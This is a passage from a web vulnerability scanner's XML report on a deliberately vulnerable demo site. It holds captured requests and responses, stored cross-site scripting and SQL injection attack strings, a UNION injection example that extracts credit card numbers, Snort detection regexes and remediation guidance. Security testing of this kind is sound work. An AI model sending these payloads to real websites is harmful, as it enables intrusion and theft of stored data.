    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<table width="100%" cellpadding="4" cellspacing="1"><tr><td colspan="2"><h2>Our guestbook</h2></td></tr><tr><td align="left" valign="middle" style="background-color:#F5F5F5"><strong>anonymous user</strong></td><td align="right" style="background-color:#F5F5F5">12.11.2020, 9:50 pm</td></tr><tr><td colspan="2"><img src="/images/remark.gif">&nbsp;&nbsp;12345<sCrIpT>alert(78254)</sCrIpT></td></tr></table>	 </div>
	  <div class="story">
	  	<form action="" method="post" name="faddentry">
			<input type="hidden" name="name" value="anonymous user">
			<textarea name="text" rows="5" wrap="VIRTUAL" style="width:500px;"></textarea>
			<br>
			<input type="submit" name="submit" value="add message">
		</form>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="4B1ECB95A3E1896DD96F219B6EC4BCC5"><Method>POST</Method><Path>/</Path><File>guestbook</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>name=anonymous%20user&amp;text=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%38%32%35%34%29%3c%2f%73%43%72%49%70%54%3e&amp;submit=add%20message</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/guestbook.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>140</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="4B1ECB95A3E1896DD96F219B6EC4BCC5";PSID="9E6C877AA131AD437C7CCB4E24D75A01";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="text";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2538%2532%2535%2534%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="47";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="43";smi="0";sc="1";ID="a49d8938";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="da0ead33";sc="1";tid="47";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>guestbook</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<table width="100%" cellpadding="4" cellspacing="1"><tr><td colspan="2"><h2>Our guestbook</h2></td></tr><tr><td align="left" valign="middle" style="background-color:#F5F5F5"><strong>anonymous user</strong></td><td align="right" style="background-color:#F5F5F5">12.11.2020, 9:50 pm</td></tr><tr><td colspan="2"><img src="/images/remark.gif">&nbsp;&nbsp;12345<sCrIpT>alert(78254)</sCrIpT></td></tr></table>	 </div>
	  <div class="story">
	  	<form action="" method="post" name="faddentry">
			<input type="hidden" name="name" value="anonymous user">
			<textarea name="text" rows="5" wrap="VIRTUAL" style="width:500px;"></textarea>
			<br>
			<input type="submit" name="submit" value="add message">
		</form>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:50:01 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5438</Value></Header></Headers><SetCookies /><Forms><Form><Action /><Method>post</Method><Name>faddentry</Name><OnSubmit /><InputFields><InputField><Name>name</Name><Value>anonymous user</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name>submit</Name><Value>add message</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas><TextArea><Name>text</Name><Value /><MaxLength>0</MaxLength><Class /></TextArea></TextAreas><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="615093DB10A3FF8686262D3363F9F4DF"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>uuname</AttackParamDescriptor><Issues><Issue id="de8d7f05-2965-48d4-93ab-d3472d5ca5f6"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5657</EngineType><AttackHTTPRequest><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 235
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="615093DB10A3FF8686262D3363F9F4DF";PSID="553EDC90FC6DCEBD97AD652FC78258EB";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="5";AttackParamDesc="uuname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="12345%2527%2509and%2509(select%2509count(*)%2509from%2509spitable)%253d1%2509or%2509%25271%2527%253d%25270%2509";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="ce39669b";
X-Request-Memo: ID="6d00391c";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

uuname=12345%27%09and%09(select%09count(*)%09from%09spitable)%3d1%09or%09%271%27%3d%270%09&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=12345&uaddress=1707%20Interdimensional%20Street&signup=signup]]></AttackHTTPRequest><VulnerabilityID>5658</VulnerabilityID><Severity>4</Severity><Name>SQL Injection (confirmed)</Name><Classifications><Classification kind="CWE" identifier="CWE-89" href="http://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="SQL Injection" href="https://vulncat.fortify.com/">SQL Injection</Classification></Classifications><DetectionSelection><Location offset="702" length="37" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="sql.rgc" /><br /><drc_sqli />

Critical SQL Injection vulnerabilities have been identified in the web application. SQL injection is a method of attack where an attacker can exploit vulnerable code and the type of data an application will accept, and can be exploited in any application parameter that influences a database query. Examples include parameters within the url itself, post data, or cookie values. If successful, SQL Injection can give an attacker access to backend database contents, the ability to remotely execute system commands, or in some circumstances the means to take control of the server hosting the database. Recommendations include employing a layered approach to security that includes utilizing parameterized queries when accepting user input, ensuring that only expected data is accepted by an application, and hardening the database server to prevent data from being accessed inappropriately.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Fundamentally, SQL Injection is an attack upon the web application, not the web server or the operating system itself. As the name implies, SQL Injection is the act of adding an unexpected SQL commands to a query, thereby manipulating the database in ways unintended by the database administrator or developer. When successful, data can be extracted, modified, inserted or deleted from database servers that are used by vulnerable web applications. In certain circumstances, SQL Injection can be utilized to take complete control of a system.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Consider a login form for a web application. If the user input from the form is directly utilized to build a dynamic SQL statement, then there has been no input validation conducted, giving control to an attacker who wants access to the database. Basically, an attacker can use an input box to send their own request to the server, and then utilize the results in a malicious manner. This is a very typical scenario considering that HTML pages often use the POST command to send parameters to another ASP page.  
The number in bold might be supplied by the client in an HTTP GET or POST parameter, like in the following URL:<br /><br />

http://www.example.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />

In the example above, the client-supplied value, <b>12345</b>, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of an item. The web application takes this value and inserts it into the SQL statement in between the single quotes in the WHERE clause.  However, consider the following URL:

<br /><br />http://www.example.com/GetItemPrice?ItemPrice?ItemNumber=0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1<br /><br />

In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of his or her choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number.




]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Each method of preventing SQL injection has its own limitations. Therefore, it is wise to employ a layered approach to preventing SQL injection, and implement several measures to prevent unauthorized access to your backend database. The following are recommended courses of action to take to prevent SQL Injection and Blind SQL Injection vulnerabilities from being exploited in your web application.<br /><br /><b>For Development:</b><br /><br />
Use the following recommendations to code web applications that are not susceptible to SQL Injection attacks. 
<ul><li><b>Parameterized Queries:</b> SQL Injection arises from an attacker’s manipulation of query data to modify query logic. The best method of preventing SQL Injection attacks is thereby to separate the logic of a query from its data. This will prevent commands inserted from user input from being executed. The downside of this approach is that it can have an impact on performance, albeit slight, and that each query on the site must be structured in this method for it to be completely effective. If one query is inadvertently bypassed, that could be enough to leave the application vulnerable to SQL Injection. The following code shows a sample SQL statement that is SQL injectable. <br /><br />

sSql = "SELECT LocationName FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = " + Request["LocationID"];<br />
oCmd.CommandText = sSql;<br /><br />

The following example utilizes parameterized queries, and is safe from SQL Injection attacks. <br /><br />

sSql = "SELECT * FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = @LocationID";<br />
oCmd.CommandText = sSql;<br />
oCmd.Parameters.Add("@LocationID", Request["LocationID"]);<br />

The application will send the SQL statement to the server without including the user’s input. Instead, a parameter-@LocationID- is used as a placeholder for that input. In this way, user input never becomes part of the command that SQL executes. Any input that an attacker inserts will be effectively negated. An error would still be generated, but it would be a simple data-type conversion error, and not something which a hacker could exploit. <br /><br />

The following code samples show a product ID being obtained from an HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />

C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString)) <br />
        { <br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn); <br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50); <br />
            prm.Value = Request.QueryString["pid"]; <br />
            cmd.Parameters.Add(prm); <br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        } <br /><br />
VB.NET sample: <br /><br />

        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString) <br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)
<br />
            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50) <br />
            prm.Value = Request.QueryString("pid") <br />
            cmd.Parameters.Add(prm) <br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br /></li><li><b>Validate input: </b>The vast majority of SQL Injection checks can be prevented by properly validating user input for both type and format. The best method of doing this is via “white listing”. This is defined as only accepting specific account numbers or specific account types for those relevant fields, or only accepting integers or letters of the English alphabet for others. Many developers will try to validate input by “black listing” characters, or “escaping” them. Basically, this entails rejecting known bad data, such as a single quotation mark, by placing an “escape” character in front of it so that the item that follows will be treated as a literal value. This approach is not as effective as white listing because it is impossible to know all forms of bad data ahead of time. 


</li></ul><b>For Security Operations:</b><br />
Use the following recommendations to help prevent SQL Injection attacks upon your web applications. 

<ul><li><b>Restrict Application Privileges: </b>Limit user credentials so that only those rights the application needs to function are utilized. Any successful SQL Injection attack would run in the context of the user’s credential. While limiting privileges will not prevent SQL Injection attacks outright, it will make them significantly harder to enact.  </li><br /><li><b>Strong SA Password Policy:</b> Often, an attacker will need the functionality of the administrator account to utilize specific SQL commands. It is much easier to “brute force” the SA password when it is weak, and will increase the likelihood of a successful SQL Injection attack. Another option is not to use the SA account at all, and instead create specific accounts for specific purposes.</li><br /><li><b>Consistent Error Messaging Scheme: </b>Ensure that you provide as little information to the user as possible when a database error occurs. Don’t reveal the entire error message. Error messages need to be dealt with on both the web and application server. When a web server encounters a processing error it should respond with a generic web page, or redirect the user to a standard location. Debug information, or other details that could be useful to a potential attacker, should never be revealed. Application servers, like WebSphere, often install with error messages or debug settings enabled by default. Consult your application server’s documentation for information on suppressing those error messages. </li><br /><br /><li><b>Stored Procedures:</b> If unused, delete SQL stored procedures such as master..Xp_cmdshell, xp_startmail, xp_sendmail, and sp_makewebtask.</li></ul>

SQL Injection vulnerabilities are inherently tied to the actual code of your web application. While not a fix, you can implement an emergency measure by adding a rule that incorporates a regular expression to your IDS to check for SQL Injection attacks.  While this will not resolve all possible SQL injection vulnerabilities, it is simple to implement, and will require an attacker to escalate his methodology to achieve a successful attack. Regular expressions that can be utilized to do this follow.

<br /><br />

Regex for detection of SQL meta-characters:<br />
/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix<br /><br />

The above regular expression would be added into a Snort rule as follows:<br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection
- Paranoid";
flow:to_server,established;uricontent:".pl";pcre:"/(\%27)|(\')|(\-\-)|(%23)|
(#)/i"; classtype:Web-application-attack; sid:9099; rev:5;)<br /><br />
	
Regex for typical SQL Injection attacks:<br />
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix<br /><br />

Regex for detecting SQL Injection with the UNION keyword:<br />
/((\%27)|(\'))union/ix<br />
(\%27)|(\') <br />
the single-quote and its hex equivalent union - the keyword union<br /><br />

Similar expressions can be written for other SQL queries such as select, insert, update, delete, drop, and so on.<br /><br />

Regex for detecting SQL Injection attacks on a MS SQL Server:<br />
/exec(\s|\+)+(s|x)p\w+/ix

<br /><br /><b>






For QA: </b><br />

Fixes for SQL Injection defects will ultimately require code based fixes. The steps detailed in the Developer and Security Operations section will provide any developer with the information necessary to remediate these issues. The following steps outline how to manually test an application for SQL Injection. <br /><br /><b>

How to manually test applications for SQL Injection:</b><br />

1. Open the web application you wish to test for SQL Injection defects in a browser. <br /><br />

2. Mouse over the links of the Web site with your cursor while paying attention to the bottom status bar. You will notice the URLs that the links point to. Try to find a URL with parameters in it. Ex. http://www.site.com/articleid.asp?id=42. <br /><br />

Note: If you don't see any URL's in the status bar, then just click on links and watch the address bar until you find a URL that has parameters. <br /><br />

3. Once a URL with parameters has been found, click the link and go to that page. In the Address bar you should now see the URL that was seen in the status bar. <br /><br />

4. There are two methods for testing scripts for SQL injection. Be sure to test each parameter value one at a time with both methods. <br /><br /><b>Method 1.</b> Go to the address bar, click your cursor, and highlight a parameter value Ex. Highlight the word value in "name=value" and replace it with a single quote (').It should now look like "name=' " <br /><br /><b>Method 2. </b>Go to the address bar, click your cursor, and put a single quote (') in the middle of the value. It should now look like "name=val'ue" <br /><br />

5. Click the 'GO' button. This will send your request to the Web server. <br /><br />

6. Analyze the response from the Web server for any error messages. Most database error messages will look similar to the examples below: <br /><br /><b>Example error 1:</b><br />
Microsoft OLE DB Provider for SQL Server error '80040e14' <br />
Unclosed quotation mark before the character string '51 ORDER BY <br />
some_name'. /some_directory/some_file.asp, line 5 <br /><br /><b>Example error 2: </b><br />
ODBC Error Code = S1000 (General error) <br />
[Oracle][ODBC][Ora]ORA-00933: SQL command not properly ended <br /><br /><b>Example error 3: </b><br />
Error: 1353 SQLSTATE: HY000 (ER_VIEW_WRONG_LIST) <br />
Message: View's SELECT and view's field list have different column counts <br /><br />

7. Sometimes the error message is not obvious and is hidden in the source of the page. To look for it, you must view the HTML source of the page and search for the error. To do this in Internet Explorer, click the 'View' menu, and select the 'Source' option. This will cause notepad to open with the HTML source of the page. In notepad, click the 'Edit' menu and select 'Find'. A dialog box will appear that will ask you to 'Find What'. Type the phrase 'Microsoft OLE DB' or '[ODBC]' and click 'Find Next'. <br /><br />

8. If either step 6 or 7 is successful, then the Web site is vulnerable to SQL injection.<br />]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />

Microsoft<br /><a href="http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx">http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx</a><br /><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;302570">http://support.microsoft.com/default.aspx?scid=kb;en-us;302570</a><br /><br />

SQLSecurity.com<br /><a href="http://www.sqlsecurity.com/DesktopDefault.aspx">http://www.sqlsecurity.com/DesktopDefault.aspx</a><br /><br />

OWASP<br /><a href="http://www.owasp.org/index.php/SQL_Injection">http://www.owasp.org/index.php/SQL_Injection</a><br />]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Fundamentally, SQL injection is an attack upon the Web application, not the Web server or the OS itself. A SQL injection attack, as the name implies, is the act of adding an unexpected SQL command to a query, thereby manipulating the database in ways unintended by the database administrator or developer. SQL injection vulnerabilities are often present in Web-based forms or query strings within a URL. For example, think of a user login form. If the user input from the form is directly used to build a dynamic SQL statement, then there has been no input validation conducted, giving control to a potential attacker who may want access to the database. Basically, an attacker can use an input box to send his own request to the server, and then use the results in nefarious ways. <br /><br />
In the following URL example, the text in bold might be supplied by the client in an HTTP GET or POST parameter: <br /><br />
http://www.server.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />
In this example, the client-supplied value, 12345, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of. The Web application takes this value and inserts it into the SQL statement between the single quotes in the WHERE clause. However, consider the following URL: <br /><br />
http://www.server.com/GetItemPrice?ItemPrice?ItemNumber=<b>0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1</b><br /><br />
This would cause the Web application to produce the following SQL statement: <br /><br />
SELECT Price FROM Products WHERE ItemNumber = <b>'0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1';</b><br /><br />
In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of the user’s choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number. SQL injection can be avoided by using secure programming techniques which prevent client-supplied values from interfering with SQL statement syntax.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[The results of a successful SQL injection attack can vary greatly depending upon the environment and configuration in which it occurs. For instance, if the database connection utilizes the security context of the database owner (dbo), a successful exploitation would give an attacker the means to modify table contents, create new tables, etc. If the default account SA is utilized, successful exploitation of a SQL Injection vulnerability could lead to an attacker gaining complete control over the SQL server, or even (by creating user accounts) to taking control of the Windows server that houses the database itself.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[SQL Injection is easy to test for, often involving something as simple as submitting a single quotation mark to see if the SQL statement can be closed, and subsequently another statement added to it. Once found, SQL Injection vulnerabilities are also relatively easy to exploit.  There are a plethora of automated hacking tools that can dramatically increase the effectiveness of this attack, and information on conducting manual attacks is widespread.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed immediately.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[SQL injection is caused by programming techniques that allow client-supplied values to interfere and modify SQL statement syntax. Thus, the best solution is to design and program web applications in a manner that prevents client-supplied values from being treated as SQL syntax. The following recommendations can be used as a basis for that. 
<ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, let that field accept only numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input.</li></ul>

